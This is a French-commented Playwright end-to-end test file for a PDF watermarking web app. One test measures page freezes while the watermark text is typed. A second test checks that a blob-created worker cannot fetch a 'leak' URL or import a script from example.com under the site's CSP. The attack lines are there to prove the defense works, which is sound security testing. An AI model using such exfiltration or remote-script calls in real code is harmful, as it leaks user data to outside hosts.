// Taper le texte du filigrane ne fige pas la page, même pendant que les
// documents sont filigranés de nouveau à chaque pause.
//
// Régression visée (2026-11-25) : sous Firefox, chaque pause dans la frappe
// lançait un rendu qui bloquait la page 0,3 s par page de PDF, et plus de 20 s
// par page avec l'ondulation. Voir e2e/responsive.seam.e2e.ts pour le moteur
// seul ; ici, l'interface entière.
//
// Fichier nommé *.e2e.ts : lancé par `bun run test:e2e`.

import { afterAll, afterEach, beforeAll, describe, expect, test } from "bun:test";
import { join } from "node:path";
import type { Browser, BrowserContext, Page } from "playwright-core";
import { launchBrowser, MAP_UPSERT_POLYFILL } from "./helpers/browser";
import { E2E_ORIGIN, startServer, type E2eServer } from "./helpers/server";
import { makeTextPdf } from "./helpers/dossier-fixtures";
import { STRINGS } from "../lib/i18n";
import { styleStorageKey } from "../lib/watermark-style";

const OUT_DIR = join(import.meta.dir, "..", "out");
const en = STRINGS.en;
/** Apparence la plus coûteuse : ondulation (une lettre à la fois) et contour marqué. */
const WAVE = { font: "sans", scale: 0.5, color: "#c4262e", opacity: 0.4, wave: 0.5, outline: "strong" };
/** Blocage toléré pendant la frappe : large, pour une machine d'intégration chargée. */
const MAX_FREEZE_MS = 250;

let server: E2eServer;
let browser: Browser;
let context: BrowserContext | undefined;

beforeAll(async () => {
  server = startServer(OUT_DIR);
  browser = await launchBrowser();
});
afterAll(async () => {
  await browser?.close();
  server?.stop();
});
afterEach(async () => {
  await context?.close();
  context = undefined;
});

const settled = (page: Page) =>
  page.waitForFunction(() => !document.querySelector('#apercu [aria-busy="true"]') && !!document.querySelector("#apercu img"), null, {
    timeout: 120_000,
  });

describe("frappe du texte du filigrane", () => {
  test(
    "un PDF de 5 pages chargé, apparence ondulée : la page reste réactive à chaque lettre, et l'aperçu suit",
    async () => {
      context = await browser.newContext({ serviceWorkers: "block", viewport: { width: 1440, height: 900 } });
      await context.addInitScript(MAP_UPSERT_POLYFILL);
      await context.addInitScript(
        ({ key, style }) => {
          try {
            localStorage.setItem(key, style);
            localStorage.setItem("tourNudged", "1");
          } catch {}
          // Battement : le plus long silence est le plus long blocage de la page.
          const w = window as unknown as { __beat: { worst: number; last: number } };
          w.__beat = { worst: 0, last: performance.now() };
          setInterval(() => {
            const now = performance.now();
            if (now - w.__beat.last > w.__beat.worst) w.__beat.worst = now - w.__beat.last;
            w.__beat.last = now;
          }, 4);
        },
        { key: styleStorageKey, style: JSON.stringify(WAVE) }
      );
      const page = await context.newPage();
      await page.goto(`${E2E_ORIGIN}/en`);
      await page
        .locator(`input[aria-label="${en.inputAria}"]`)
        .setInputFiles([{ name: "payslips.pdf", mimeType: "application/pdf", buffer: Buffer.from(await makeTextPdf(5, 70)) }]);
      const purpose = page.getByLabel(en.purpose.label);
      await purpose.fill("Rental application");
      await settled(page);
      const before = await page.locator("#apercu img").first().getAttribute("src");

      await page.evaluate(() => {
        const w = window as unknown as { __beat: { worst: number; last: number } };
        w.__beat.worst = 0;
        w.__beat.last = performance.now();
      });
      // Frappe lente : après chaque lettre, le rendu a le temps de démarrer
      // (500 ms de pause), et la lettre suivante l'interrompt.
      await purpose.press("End");
      for (const ch of " for M") {
        await page.keyboard.type(ch);
        await page.waitForTimeout(650);
      }
      await page.keyboard.type("artin Lettings", { delay: 80 });
      const freeze = await page.evaluate(() => (window as unknown as { __beat: { worst: number } }).__beat.worst);
      expect(await purpose.inputValue()).toBe("Rental application for Martin Lettings");
      expect(freeze, `plus long blocage pendant la frappe : ${Math.round(freeze)} ms`).toBeLessThan(MAX_FREEZE_MS);

      // L'aperçu finit par porter le nouveau texte (un nouveau rendu, donc une nouvelle image).
      await page.waitForFunction((src) => document.querySelector<HTMLImageElement>("#apercu img")?.src !== src, before, { timeout: 60_000 });
      await settled(page);
    },
    180_000
  );
});

// La CSP autorise les workers créés depuis un blob (`worker-src 'self' blob:`).
// Le site n'en crée aucun aujourd'hui, mais un script qui parviendrait à
// s'exécuter le pourrait : encore faut-il qu'un tel worker ne puisse rien
// faire sortir de la page. Un worker né d'un blob hérite
// de la politique de la page (docs/security.md §4.1) : on le vérifie.
describe("worker créé depuis un blob", () => {
  test(
    "il ne peut ni contacter un autre site, ni y charger un script",
    async () => {
      context = await browser.newContext({ serviceWorkers: "block" });
      const requests: string[] = [];
      context.on("request", (r) => requests.push(r.url()));
      const page = await context.newPage();
      await page.goto(`${E2E_ORIGIN}/en`);
      const result = await page.evaluate(
        () =>
          new Promise<Record<string, string>>((resolve) => {
            const source = `self.onmessage = async () => {
              const r = {};
              try { await fetch("https://example.com/leak", { mode: "no-cors" }); r.fetch = "allowed"; } catch { r.fetch = "blocked"; }
              try { importScripts("https://example.com/x.js"); r.importScripts = "allowed"; } catch { r.importScripts = "blocked"; }
              self.postMessage(r);
            };`;
            const worker = new Worker(URL.createObjectURL(new Blob([source], { type: "text/javascript" })));
            worker.onmessage = (e) => resolve(e.data);
            worker.onerror = (e) => resolve({ error: e.message });
            worker.postMessage(1);
          })
      );
      expect(result).toEqual({ fetch: "blocked", importScripts: "blocked" });
      expect(requests.filter((u) => !u.startsWith(`${E2E_ORIGIN}/`) && !u.startsWith("blob:") && !u.startsWith("data:"))).toEqual([]);
    },
    60_000
  );
});
